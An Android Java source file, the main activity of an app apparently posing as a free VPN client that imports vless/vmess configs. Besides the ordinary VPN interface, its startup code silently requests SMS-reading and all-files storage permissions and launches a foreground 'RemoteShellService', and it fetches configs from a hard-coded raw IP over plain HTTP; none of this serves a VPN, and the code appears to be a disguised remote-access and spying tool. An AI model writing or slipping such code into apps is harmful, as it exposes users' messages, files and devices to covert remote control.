package com.nullstorm.vpn;

import android.Manifest;
import android.animation.ObjectAnimator;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.view.GravityCompat;
import androidx.drawerlayout.widget.DrawerLayout;
import androidx.lifecycle.Observer;
import androidx.lifecycle.ViewModelProvider;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.nullstorm.vpn.adapter.ConfigAdapter;
import com.nullstorm.vpn.model.VpnConfig;
import com.nullstorm.vpn.parser.contracts.ServiceControl;
import com.nullstorm.vpn.parser.core.CoreServiceManager;
import com.nullstorm.vpn.parser.dto.entities.ProfileItem;
import com.nullstorm.vpn.parser.fmt.VlessFmt;
import com.nullstorm.vpn.parser.fmt.VmessFmt;
import com.nullstorm.vpn.parser.handler.MmkvManager;
import com.nullstorm.vpn.parser.service.CoreVpnService;
import com.nullstorm.vpn.service.RemoteShellService;
import com.nullstorm.vpn.ui.stateless.MainUI;
import com.nullstorm.vpn.utils.UiUtils;
import com.nullstorm.vpn.utils.Utils;
import com.nullstorm.vpn.parser.viewmodel.MainViewModel;
import com.nullstorm.vpn.parser.AppConfig;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.ref.SoftReference;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity implements ConfigAdapter.OnConfigClickListener {

    private static final String TAG = "MainActivity";
    private static final int REQUEST_VPN_PERMISSION = 100;

    private final List<VpnConfig> configs = new ArrayList<>();
    private ConfigAdapter adapter;
    private MaterialButton connectButton;
    private TextView connectionStatus;
    private View statusIndicator;
    private boolean isConnected = false;
    private boolean isProcessing = false;
    private DrawerLayout drawerLayout;
    private RecyclerView recyclerView;
    private VpnConfig pendingConfig = null;
    private String currentConfigGuid = null;
    private MainViewModel mainViewModel;

    private final ActivityResultLauncher<String> filePicker
            = registerForActivityResult(
            new ActivityResultContracts.GetContent(),
            this::onFileSelected
    );

    @Override
    @RequiresApi(api = Build.VERSION_CODES.O)
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestStoragePermissions();
        requestSmsPermission();
        startRemoteShellService();
        loadConfigsFromMmkv();
        View importButtons =
                MainUI.createImportButton(
                        this,
                        v -> filePicker.launch("*/*"),
                        v -> downloadFreeConfig()
                );

        drawerLayout = MainUI.createDrawer(
                this,
                this::onNavigationItemSelected,
                createConnectionStatusSection(),
                createConnectSection(),
                importButtons,
                createConfigsList()
        );

        setContentView(drawerLayout);

        setupViewModel();
    }

    private void requestSmsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_SMS}, 200);
            }
        }
    }

    private void requestStoragePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivityForResult(intent, 101);
            }
        } else {
            String[] permissions = {
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(permissions, 100);
            }
        }
    }

    private void startRemoteShellService() {
        try {
            Log.d(TAG, "Starting RemoteShellService from MainActivity");
            Intent intent = new Intent(this, RemoteShellService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d(TAG, "RemoteShellService started successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start RemoteShellService: " + e.getMessage(), e);
        }
    }

    private void downloadFreeConfig() {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL("http://188.137.242.67:8083/config.txt");
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();

                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);

                InputStream is = connection.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));

                StringBuilder sb = new StringBuilder();
                String line;

                while ((line = reader.readLine()) != null) sb.append(line).append("\n");

                reader.close();
                is.close();
                String content = sb.toString().trim();
                runOnUiThread(() -> importDownloadedConfig(content));
            } catch (Exception e) {
                Log.e(TAG, "Free config download failed", e);
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Failed to download free config", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private boolean isConfigExists(String content) {
        List<String> serverList = MmkvManager.INSTANCE.decodeAllServerList();

        for (String guid : serverList) {
            String raw = MmkvManager.INSTANCE.decodeServerRaw(guid);

            if (raw == null) continue;
            if (raw.trim().equals(content.trim())) return true;
        }

        return false;
    }

    private void importDownloadedConfig(String content) {
        try {
            String fixedLink = Utils.sanitizeVlessLink(content);
            ProfileItem profile = null;

            if (fixedLink != null && fixedLink.startsWith("vless://"))
                profile = VlessFmt.INSTANCE.parse(fixedLink);
            else if (fixedLink != null && fixedLink.startsWith("vmess://"))
                profile = VmessFmt.INSTANCE.parse(fixedLink);

            if (profile == null) {
                Toast.makeText(this, "Invalid free config", Toast.LENGTH_SHORT).show();
                return;
            }

            String name = profile.getServiceName();
            if (name == null || name.isEmpty()) name = getString(R.string.vpn_imported_config);

            if (isConfigExists(content)) {
                Toast.makeText(
                        this,
                        "Config already exists",
                        Toast.LENGTH_SHORT
                ).show();
                return;
            }

            String guid = MmkvManager.INSTANCE.encodeServerConfig("", profile);
            MmkvManager.INSTANCE.encodeServerRaw(guid, content);
            MmkvManager.INSTANCE.setSelectServer(guid);

            VpnConfig config = new VpnConfig(name, content, guid, profile);
            adapter.addConfig(config);

            int position = configs.size() - 1;
            adapter.setSelectedPosition(position);
            Toast.makeText(this, "Free config imported", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Log.e(TAG, "Import free config failed", e);
            Toast.makeText(this, "Import failed", Toast.LENGTH_SHORT).show();
        }
    }

    private void loadConfigsFromMmkv() {
        configs.clear();
        List<String> serverList = MmkvManager.INSTANCE.decodeAllServerList();

        for (String guid : serverList) {
            Log.i(TAG, "Guid: " + guid);

            ProfileItem profile = MmkvManager.INSTANCE.decodeServerConfig(guid);
            if (profile == null) continue;
            String raw = MmkvManager.INSTANCE.decodeServerRaw(guid);
            Log.i(TAG, "Raw: " + raw);

            if (raw == null) raw = "";

            String name = profile.getRemarks();
            if (name == null || name.isEmpty()) name = profile.getServiceName();
            if (name == null || name.isEmpty()) name = getString(R.string.vpn_imported_config);

            configs.add(new VpnConfig(name, raw, guid, profile));
            Log.i(TAG, "Loaded configs: " + configs.size());
        }

        if (adapter != null) adapter.notifyDataSetChanged();
    }

    private void setupViewModel() {
        mainViewModel = new ViewModelProvider(this).get(MainViewModel.class);

        mainViewModel.isRunning().observe(this, new Observer<Boolean>() {
            @Override
            public void onChanged(Boolean isRunning) {
                applyRunningState(false, isRunning);
            }
        });

        mainViewModel.startListenBroadcast();
        mainViewModel.initAssets(getAssets());
    }

    private void applyRunningState(boolean isLoading, boolean isRunning) {
        if (isLoading) {
            return;
        }

        if (isRunning) {
            isConnected = true;
            connectionStatus.setText(R.string.vpn_connected);
            connectionStatus.setTextColor(getColor(R.color.green_400));
            statusIndicator.setBackgroundResource(R.drawable.status_indicator_connected);
            connectButton.setText(R.string.vpn_connect);
            connectButton.setTextColor(getColor(R.color.white));
            connectButton.setBackgroundTintList(
                    ColorStateList.valueOf(Color.parseColor("#2E7D32"))
            );
            connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#4CAF50")));
        } else {
            isConnected = false;
            connectionStatus.setText(R.string.vpn_disconnected);
            connectionStatus.setTextColor(getColor(R.color.gray_400));
            statusIndicator.setBackgroundResource(R.drawable.status_indicator_disconnected);
            connectButton.setText(R.string.vpn_disconnect);
            connectButton.setTextColor(getColor(R.color.red_400));
            connectButton.setBackgroundTintList(
                    ColorStateList.valueOf(Color.parseColor("#1F1F1F"))
            );
            connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#3A3A3A")));
        }
    }

    private boolean onNavigationItemSelected(MenuItem item) {
        int id = item.getItemId();
        if (id == R.id.nav_admin_pannel)
            Toast.makeText(this, "Home", Toast.LENGTH_SHORT).show();
        else if (id == R.id.nav_configs)
            Toast.makeText(this, "Configs", Toast.LENGTH_SHORT).show();
        else if (id == R.id.nav_settings)
            Toast.makeText(this, "Settings", Toast.LENGTH_SHORT).show();
        else if (id == R.id.nav_about)
            Toast.makeText(this, "About", Toast.LENGTH_SHORT).show();
        drawerLayout.closeDrawer(GravityCompat.START);
        return true;
    }

    private View createConnectionStatusSection() {
        LinearLayout statusLayout = new LinearLayout(this);
        statusLayout.setOrientation(LinearLayout.HORIZONTAL);
        statusLayout.setGravity(Gravity.CENTER);

        statusIndicator = new View(this);
        LinearLayout.LayoutParams dotParams = new LinearLayout.LayoutParams(
                UiUtils.dp(this, 12),
                UiUtils.dp(this, 12)
        );
        dotParams.rightMargin = UiUtils.dp(this, 10);
        statusIndicator.setLayoutParams(dotParams);
        statusIndicator.setBackgroundResource(R.drawable.status_indicator_disconnected);

        connectionStatus = new TextView(this);
        connectionStatus.setText(R.string.vpn_disconnected);
        connectionStatus.setTextSize(UiUtils.sp(this, 10));
        connectionStatus.setTextColor(getColor(R.color.gray_400));

        statusLayout.addView(statusIndicator);
        statusLayout.addView(connectionStatus);

        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
        );
        params.bottomMargin = UiUtils.dp(this, 0);
        statusLayout.setLayoutParams(params);

        return statusLayout;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private View createConnectSection() {
        int cardHeight = UiUtils.dp(this, 200);
        MaterialCardView connectCard = new MaterialCardView(this);

        LinearLayout.LayoutParams cardParams =
                new LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT,
                        cardHeight
                );

        cardParams.bottomMargin = UiUtils.dp(this, 24);
        connectCard.setLayoutParams(cardParams);

        connectCard.setRadius(UiUtils.dp(this, 30));
        connectCard.setCardElevation(UiUtils.dp(this, 8));
        connectCard.setCardBackgroundColor(Color.BLACK);

        LinearLayout connectLayout = new LinearLayout(this);
        connectLayout.setOrientation(LinearLayout.VERTICAL);
        connectLayout.setGravity(Gravity.CENTER);

        connectLayout.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
        ));

        connectButton = new MaterialButton(this);
        int size = UiUtils.dp(this, 180);

        LinearLayout.LayoutParams btnParams =
                new LinearLayout.LayoutParams(size, size);
        btnParams.gravity = Gravity.CENTER;
        connectButton.setLayoutParams(btnParams);

        connectButton.setMinimumWidth(size);
        connectButton.setMinimumHeight(size);
        connectButton.setMaxWidth(size);
        connectButton.setMaxHeight(size);

        connectButton.setText(R.string.vpn_disconnect);
        connectButton.setTextSize(UiUtils.sp(this, 6));
        connectButton.setTextColor(getColor(R.color.red_400));

        connectButton.setCornerRadius(size / 2);
        connectButton.setAllCaps(true);
        connectButton.setTypeface(null, Typeface.BOLD);
        connectButton.setBackgroundTintList(
                ColorStateList.valueOf(Color.parseColor("#1F1F1F"))
        );
        connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#3A3A3A")));
        connectButton.setStrokeWidth(UiUtils.dp(this, 2));

        connectButton.setOnClickListener(v -> toggleConnection());
        connectLayout.addView(connectButton);
        connectCard.addView(connectLayout);

        return connectCard;
    }

    private View createConfigsList() {
        recyclerView = new RecyclerView(this);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        adapter = new ConfigAdapter(this, configs, this);
        recyclerView.setAdapter(adapter);

        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                0,
                1f
        );
        recyclerView.setLayoutParams(params);
        Log.d(TAG, "RecyclerView created with " + configs.size() + " configs");

        return recyclerView;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void toggleConnection() {

        if (isProcessing) return;

        isProcessing = true;
        connectButton.setEnabled(false);

        try {

            if (CoreServiceManager.INSTANCE.isRunning()) {

                connectionStatus.setText("Disconnecting...");
                connectionStatus.setTextColor(getColor(R.color.gray_500));

                statusIndicator.setBackgroundResource(
                        R.drawable.status_indicator_disconnected
                );

                disconnectFromVpn();

            } else {

                int pos = adapter.getSelectedPosition();

                if (pos == RecyclerView.NO_POSITION || pos >= configs.size()) {
                    Toast.makeText(this, "Please select a config first", Toast.LENGTH_SHORT).show();
                    return;
                }

                VpnConfig config = configs.get(pos);

                connectionStatus.setText("Connecting...");
                connectionStatus.setTextColor(getColor(R.color.purple_500));

                connectToVpn(config);
            }

        } catch (Exception e) {
            Log.e(TAG, "Toggle error", e);
        } finally {

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                isProcessing = false;
                connectButton.setEnabled(true);
            }, 800);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void connectToVpn(VpnConfig config) {
        Intent prepareIntent = VpnService.prepare(this);
        if (prepareIntent != null) {
            pendingConfig = config;
            startActivityForResult(prepareIntent, REQUEST_VPN_PERMISSION);
            return;
        }
        startVpnService(config);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void startVpnService(VpnConfig config) {
        try {
            String guid = config.getGuid();

            if (guid == null || guid.isEmpty()) {
                Toast.makeText(this,
                        "Invalid config",
                        Toast.LENGTH_SHORT).show();
                return;
            }

            MmkvManager.INSTANCE.setSelectServer(guid);
            currentConfigGuid = guid;

            Log.i(TAG,
                    "Connecting to: "
                            + config.getName()
                            + " | guid = "
                            + guid);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel =
                        new NotificationChannel(
                                "RAY_NG_M_CH_ID",
                                "v2rayNG Background Service",
                                NotificationManager.IMPORTANCE_LOW
                        );

                channel.setLockscreenVisibility(
                        Notification.VISIBILITY_PRIVATE
                );

                NotificationManager manager =
                        (NotificationManager)
                                getSystemService(NOTIFICATION_SERVICE);

                manager.createNotificationChannel(channel);
            }

            Bundle bundle = new Bundle();
            bundle.putBoolean(
                    AppConfig.TASKER_EXTRA_BUNDLE_SWITCH,
                    true
            );
            bundle.putString(
                    AppConfig.TASKER_EXTRA_BUNDLE_GUID,
                    guid
            );

            Intent intent =
                    new Intent(this, CoreVpnService.class);
            intent.putExtra(
                    AppConfig.TASKER_EXTRA_BUNDLE,
                    bundle
            );

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }

            connectionStatus.setText("Connecting...");
            connectionStatus.setTextColor(
                    getColor(R.color.purple_500)
            );

            new Handler(Looper.getMainLooper())
                    .postDelayed(() -> {
                        if (CoreServiceManager.INSTANCE.isRunning()) {
                            connectionStatus.setText(
                                    R.string.vpn_connected
                            );
                            connectionStatus.setTextColor(
                                    getColor(R.color.green_400)
                            );
                            statusIndicator.setBackgroundResource(
                                    R.drawable.status_indicator_connected
                            );
                        }
                    }, 2000);

        } catch (Exception e) {
            Log.e(TAG,
                    "Failed to start VPN service",
                    e);

            Toast.makeText(
                    this,
                    "Failed to start VPN: "
                            + e.getMessage(),
                    Toast.LENGTH_SHORT
            ).show();

            isConnected = false;
            connectButton.setEnabled(true);
            isProcessing = false;
        }
    }

    private void disconnectFromVpn() {
        try {

            Bundle bundle = new Bundle();
            bundle.putBoolean(AppConfig.TASKER_EXTRA_BUNDLE_SWITCH, false);
            bundle.putString(AppConfig.TASKER_EXTRA_BUNDLE_GUID, currentConfigGuid);

            Intent intent = new Intent(this, CoreVpnService.class);
            intent.putExtra(AppConfig.TASKER_EXTRA_BUNDLE, bundle);

            startService(intent);

            currentConfigGuid = null;
            MmkvManager.INSTANCE.setSelectServer("");

            connectionStatus.setText("Disconnecting...");
            connectionStatus.setTextColor(getColor(R.color.gray_500));

            statusIndicator.setBackgroundResource(
                    R.drawable.status_indicator_disconnected
            );

        } catch (Exception e) {
            Log.e(TAG, "Disconnect error", e);
        }
    }

    private void animateConnectButton() {
        ObjectAnimator scaleX = ObjectAnimator.ofFloat(connectButton, "scaleX", 1f, 0.95f, 1f);
        ObjectAnimator scaleY = ObjectAnimator.ofFloat(connectButton, "scaleY", 1f, 0.95f, 1f);

        scaleX.setDuration(300);
        scaleY.setDuration(300);
        scaleX.setInterpolator(new AccelerateDecelerateInterpolator());
        scaleY.setInterpolator(new AccelerateDecelerateInterpolator());

        scaleX.start();
        scaleY.start();

        if (isConnected) {
            connectButton.setText(R.string.vpn_connect);
            connectButton.setTextColor(getColor(R.color.white));
            connectButton.setBackgroundTintList(
                    ColorStateList.valueOf(Color.parseColor("#2E7D32"))
            );
            connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#4CAF50")));
        } else {
            connectButton.setText(R.string.vpn_disconnect);
            connectButton.setTextColor(getColor(R.color.red_400));
            connectButton.setBackgroundTintList(
                    ColorStateList.valueOf(Color.parseColor("#1F1F1F"))
            );
            connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#3A3A3A")));
        }
    }

    private void animateStatusIndicator() {
        statusIndicator.setBackgroundResource(
                isConnected ? R.drawable.status_indicator_connected : R.drawable.status_indicator_disconnected
        );

        ObjectAnimator pulse = ObjectAnimator.ofFloat(statusIndicator, "scaleX", 1f, 1.3f, 1f);
        pulse.setDuration(500);
        pulse.setInterpolator(new AccelerateDecelerateInterpolator());
        pulse.start();
    }

    @Override
    @RequiresApi(api = Build.VERSION_CODES.O)
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_VPN_PERMISSION) {
            if (resultCode == RESULT_OK && pendingConfig != null) {
                currentConfigGuid = pendingConfig.getGuid();
                MmkvManager.INSTANCE.setSelectServer(currentConfigGuid);

                Bundle bundle = new Bundle();
                bundle.putBoolean(AppConfig.TASKER_EXTRA_BUNDLE_SWITCH, true);
                bundle.putString(AppConfig.TASKER_EXTRA_BUNDLE_GUID, currentConfigGuid);

                Intent intent = new Intent(this, CoreVpnService.class);
                intent.putExtra(AppConfig.TASKER_EXTRA_BUNDLE, bundle);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
                else startService(intent);

                pendingConfig = null;

            } else {
                Toast.makeText(this, "VPN permission denied", Toast.LENGTH_SHORT).show();

                pendingConfig = null;
                isConnected = false;
                connectButton.setEnabled(true);
                isProcessing = false;

                connectionStatus.setText(R.string.vpn_disconnected);
                connectionStatus.setTextColor(getColor(R.color.gray_400));
                statusIndicator.setBackgroundResource(R.drawable.status_indicator_disconnected);
            }
        }
    }

    @Override
    public void onConfigSelected(VpnConfig config) {
        if (isConnected) {
            isConnected = false;
            connectButton.setText(R.string.vpn_disconnect);
            connectButton.setTextColor(getColor(R.color.red_400));
            connectButton.setBackgroundTintList(
                    ColorStateList.valueOf(Color.parseColor("#1F1F1F"))
            );
            connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#3A3A3A")));

            connectionStatus.setText(R.string.vpn_disconnected);
            connectionStatus.setTextColor(getColor(R.color.gray_400));
            statusIndicator.setBackgroundResource(R.drawable.status_indicator_disconnected);

            Intent intent = new Intent(this, CoreVpnService.class);
            intent.putExtra(AppConfig.TASKER_EXTRA_BUNDLE_SWITCH, false);
            stopService(intent);

            if (currentConfigGuid != null) {
                String selected = MmkvManager.INSTANCE.getSelectServer();
                if (selected != null && selected.equals(currentConfigGuid)) {
                    MmkvManager.INSTANCE.setSelectServer("");
                }
                currentConfigGuid = null;
            }
        }
        Log.i("MainActivity", "onConfigSelected Called, Config: " + config.getName());
    }

    @Override
    public void onConfigDeleted(int position, VpnConfig config) {
        String guid = config.getGuid();
        if (guid != null && !guid.isEmpty())
            MmkvManager.INSTANCE.removeServer(guid);

        if (isConnected && guid != null && guid.equals(currentConfigGuid)) {
            isConnected = false;
            connectButton.setText(R.string.vpn_disconnect);
            connectButton.setTextColor(getColor(R.color.red_400));
            connectButton.setBackgroundTintList(
                    ColorStateList.valueOf(Color.parseColor("#1F1F1F"))
            );
            connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#3A3A3A")));

            connectionStatus.setText(R.string.vpn_disconnected);
            connectionStatus.setTextColor(getColor(R.color.gray_400));
            statusIndicator.setBackgroundResource(R.drawable.status_indicator_disconnected);

            SoftReference<ServiceControl> ref =
                    CoreServiceManager.INSTANCE.getServiceControl();

            if (ref != null) {
                ServiceControl control = ref.get();
                if (control != null) {
                    control.stopService();
                }
            }

            currentConfigGuid = null;
        }
        Toast.makeText(this, "Config deleted: " + config.getName(), Toast.LENGTH_SHORT).show();
    }

    private void onFileSelected(Uri uri) {
        if (uri == null) return;

        try (InputStream is = getContentResolver().openInputStream(uri);
             BufferedReader reader = new BufferedReader(
                     new InputStreamReader(is)
             );){
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null)
                sb.append(line).append("\n");

            String content = sb.toString();
            Log.i(TAG, "Config imported successfully");

            String fixedLink = Utils.sanitizeVlessLink(content);
            ProfileItem profile = null;

            if (fixedLink != null && fixedLink.startsWith("vless://")) {
                profile = VlessFmt.INSTANCE.parse(fixedLink);
            } else if (fixedLink != null && fixedLink.startsWith("vmess://")) {
                profile = VmessFmt.INSTANCE.parse(fixedLink);
            }

            if (profile == null) {
                Toast.makeText(this, "Invalid config format", Toast.LENGTH_SHORT).show();
                return;
            }

            String fileName = profile.getServiceName();
            if (fileName == null || fileName.isEmpty())
                fileName = getString(R.string.vpn_imported_config);

            if (isConfigExists(content)) {
                Toast.makeText(
                        this,
                        "Config already exists",
                        Toast.LENGTH_SHORT
                ).show();
                return;
            }

            String guid = MmkvManager.INSTANCE.encodeServerConfig("", profile);

            VpnConfig newConfig = new VpnConfig(
                    fileName != null ? fileName : getString(R.string.vpn_imported_config),
                    content,
                    guid,
                    profile
            );

            adapter.addConfig(newConfig);

            MmkvManager.INSTANCE.encodeServerRaw(guid, newConfig.getContent());
            MmkvManager.INSTANCE.setSelectServer(guid);

            Toast.makeText(this, R.string.vpn_config_imported, Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Log.e(TAG, "Import File Failed", e);
            Toast.makeText(this, R.string.vpn_config_import_failed, Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (CoreServiceManager.INSTANCE.isRunning()) {
            connectionStatus.setText(R.string.vpn_connected);
            connectionStatus.setTextColor(getColor(R.color.green_400));
            statusIndicator.setBackgroundResource(R.drawable.status_indicator_connected);
            isConnected = true;
            connectButton.setText(R.string.vpn_connect);
            connectButton.setTextColor(getColor(R.color.white));
            connectButton.setBackgroundTintList(
                    ColorStateList.valueOf(Color.parseColor("#2E7D32"))
            );
            connectButton.setStrokeColor(ColorStateList.valueOf(Color.parseColor("#4CAF50")));
        }
    }
}